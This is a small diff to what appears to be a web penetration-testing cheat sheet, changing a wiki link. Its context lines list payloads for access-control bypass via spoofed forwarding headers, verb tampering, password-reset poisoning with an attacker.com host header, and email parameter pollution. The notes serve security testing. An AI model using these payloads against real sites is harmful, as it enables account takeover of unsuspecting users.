@@ -39,7 +39,7 @@ X-Forwarded-For: 127.0.0.1   X-Forwarded-Host: localhost   Referer: https://targ
 verb tamper: GET->POST/PUT/HEAD/TRACE/PATCH ;  /api/v1->/api/v2
 ```
 
-## Password reset / takeover (see [[account-takeover]])
+## Password reset / takeover (see [[wiki/techniques/web/account-takeover]])
 ```
 Host: attacker.com         X-Forwarded-Host: attacker.com      # reset poisoning
 email=victim@x.com&email=attacker@x.com                        # param pollution
